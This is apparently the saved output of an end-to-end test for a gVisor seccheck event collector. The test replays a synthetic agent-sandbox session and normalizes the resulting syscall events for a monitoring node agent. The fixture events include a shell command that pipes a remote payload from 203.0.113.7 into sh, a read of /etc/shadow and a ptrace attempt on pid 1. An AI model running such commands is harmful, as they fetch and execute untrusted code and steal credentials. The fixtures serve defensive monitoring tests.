@@ -1,0 +1,23 @@
+./scripts/e2e.sh
+==> building
+==> starting collector on /tmp/gvisor_events.p6QB.sock
+==> replaying agent-sandbox session with fakesentry
+fakesentry: connected, server version=1
+fakesentry: sent 8 points, closing.
+
+==> collector stderr:
+    collector: listening on /tmp/gvisor_events.p6QB.sock (SOCK_SEQPACKET). Waiting for a Sentry to connect...
+    collector: handshake ok (peer version=1)
+    collector: client disconnected. points=8 mapped=7 unmapped=1 dropped(reported by sender)=0
+
+==> normalized events (stdout):
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_CONTAINER_START","node_agent_event_type":"","node_agent_mapped":false,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"runsc","cwd":"/workspace","time_ns":1787001642483328066,"details":{"args":["/usr/bin/python3","-m","agent.main"],"cwd":"/workspace","id":"agent-sandbox-actor-7f3a2b19"}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SENTRY_CLONE","node_agent_event_type":"fork","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"python3","cwd":"/workspace","time_ns":1787001642483329062,"details":{"created_thread_group_id":57,"created_thread_id":57}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SYSCALL_EXECVE","node_agent_event_type":"exec","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"python3","cwd":"/workspace","time_ns":1787001642483329529,"details":{"argv":["sh","-c","curl -s http://203.0.113.7/payload | sh"],"envv_count":2,"exit_errno":0,"exit_result":0,"pathname":"/bin/sh"}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SYSCALL_SOCKET","node_agent_event_type":"network","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"sh","cwd":"/workspace","time_ns":1787001642483330559,"details":{"domain":2,"protocol":0,"type":1}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SYSCALL_CONNECT","node_agent_event_type":"network","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"curl","cwd":"/workspace","time_ns":1787001642483330987,"details":{"exit_errno":0,"exit_result":0,"fd":3,"remote":"203.0.113.7:80"}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SYSCALL_OPEN","node_agent_event_type":"open","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"sh","cwd":"/workspace","time_ns":1787001642483344395,"details":{"exit_errno":0,"exit_result":4,"fd_path":"/etc/shadow","flags":0,"pathname":"/etc/shadow"}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SYSCALL_PTRACE","node_agent_event_type":"ptrace","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"sh","cwd":"/workspace","time_ns":1787001642483344715,"details":{"exit_errno":1,"exit_result":-1,"pid":1,"request":16}}
+    {"source":"gvisor/seccheck","seccheck_message":"MESSAGE_SENTRY_TASK_EXIT","node_agent_event_type":"exit","node_agent_mapped":true,"container_id":"agent-sandbox-actor-7f3a2b19","pid":42,"tgid":42,"process_name":"python3","cwd":"/workspace","time_ns":1787001642483345258,"details":{"exit_status":0}}
+
+PASS: 8/8 points decoded from the real seccheck wire format and normalized to node-agent events.
